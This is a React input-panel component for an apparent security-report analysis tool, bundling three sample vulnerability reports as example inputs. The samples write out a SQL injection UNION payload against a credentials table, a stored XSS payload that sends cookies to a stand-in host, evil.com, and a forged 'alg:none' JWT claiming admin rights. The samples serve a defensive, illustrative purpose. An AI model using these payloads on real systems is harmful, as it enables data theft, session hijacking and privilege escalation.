import { useRef, useEffect } from 'react';
import { motion } from 'framer-motion';
import { FileText, Sparkles } from 'lucide-react';

const EXAMPLE_REPORTS = [
  {
    label: 'SQL Injection',
    text: `VULNERABILITY REPORT — SQL Injection in User Search

Title: Blind SQL Injection in /api/users/search endpoint
Severity: Critical
Date: 2026-04-01

Description:
The search endpoint at /api/users/search accepts a "q" parameter that is directly concatenated into a SQL query without sanitization or parameterization:

  query = "SELECT * FROM users WHERE name LIKE '%" + request.params.q + "%'"

An attacker can inject arbitrary SQL via the q parameter:
  GET /api/users/search?q=' UNION SELECT username,password,null FROM credentials--

Impact:
- Full database read access including credentials table
- Ability to extract all user passwords and PII
- Potential for data exfiltration of entire database

Steps to Reproduce:
1. Navigate to /api/users/search?q=test
2. Replace q with: ' UNION SELECT 1,2,3--
3. Observe raw database output in response

Affected Component: Database / API layer
Environment: Production (api.example.com)`,
  },
  {
    label: 'Stored XSS',
    text: `VULNERABILITY REPORT — Stored XSS via Profile Bio

Title: Persistent Cross-Site Scripting in User Profile Biography
Severity: High

Description:
The user profile bio field does not sanitize HTML or JavaScript input before rendering. An attacker can set their bio to:

  <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

When any user views the attacker's profile, the script executes in the victim's browser context, allowing session hijacking via cookie theft.

Impact:
- Session hijacking of any user who views the profile
- Account takeover through stolen session tokens
- Potential worm-like propagation if combined with auto-follow

Affected Component: Frontend rendering, missing output encoding
Environment: Production`,
  },
  {
    label: 'Auth Bypass',
    text: `VULNERABILITY REPORT — Authentication Bypass via JWT Manipulation

Title: JWT Algorithm Confusion allows admin access
Severity: Critical

Description:
The application accepts JWT tokens signed with the "none" algorithm. By modifying the JWT header from {"alg":"RS256"} to {"alg":"none"} and removing the signature, an attacker can forge arbitrary claims including admin role escalation.

  Modified token: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.

The server validates this token successfully and grants admin privileges.

Impact:
- Complete authentication bypass
- Privilege escalation to admin role
- Full administrative access to all platform features

Affected Component: Auth / JWT validation
Environment: Production`,
  },
];

export default function InputPanel({ value, onChange, disabled }) {
  const textareaRef = useRef(null);

  useEffect(() => {
    const el = textareaRef.current;
    if (!el) return;
    el.style.height = 'auto';
    el.style.height = Math.max(180, Math.min(el.scrollHeight, 400)) + 'px';
  }, [value]);

  const insertExample = (text) => {
    onChange(text);
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 16 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.45, ease: [0.4, 0, 0.2, 1] }}
    >
      {/* Example buttons */}
      <div className="flex items-center gap-2 mb-3 flex-wrap">
        <span className="text-xs font-medium text-[var(--text-tertiary)] uppercase tracking-wider mr-1 flex items-center gap-1.5">
          <Sparkles size={12} />
          Examples
        </span>
        {EXAMPLE_REPORTS.map((ex) => (
          <button
            key={ex.label}
            onClick={() => insertExample(ex.text)}
            disabled={disabled}
            className="text-xs px-3 py-1.5 rounded-lg bg-[rgba(255,255,255,0.04)] border border-[var(--border-subtle)]
                       text-[var(--text-secondary)] hover:text-[var(--text-primary)] hover:bg-[rgba(255,255,255,0.07)]
                       hover:border-[var(--border-active)] transition-all duration-200 cursor-pointer disabled:opacity-40"
          >
            {ex.label}
          </button>
        ))}
      </div>

      {/* Textarea */}
      <div className="glass-card relative group">
        <div className="absolute top-4 left-4 pointer-events-none">
          <FileText size={16} className="text-[var(--text-tertiary)] group-focus-within:text-[var(--accent-violet)] transition-colors" />
        </div>
        <textarea
          ref={textareaRef}
          value={value}
          onChange={(e) => onChange(e.target.value)}
          disabled={disabled}
          placeholder="Paste a vulnerability report, security advisory, or code snippet for analysis..."
          className="w-full bg-transparent text-sm leading-relaxed text-[var(--text-primary)]
                     placeholder:text-[var(--text-tertiary)] p-4 pl-11
                     focus:ring-1 focus:ring-[var(--accent-violet)]/30 rounded-[1rem]
                     disabled:opacity-50 min-h-[180px] transition-all"
        />
        {value && (
          <div className="absolute bottom-3 right-4 text-xs text-[var(--text-tertiary)] font-mono">
            {value.length.toLocaleString()} chars
          </div>
        )}
      </div>
    </motion.div>
  );
}
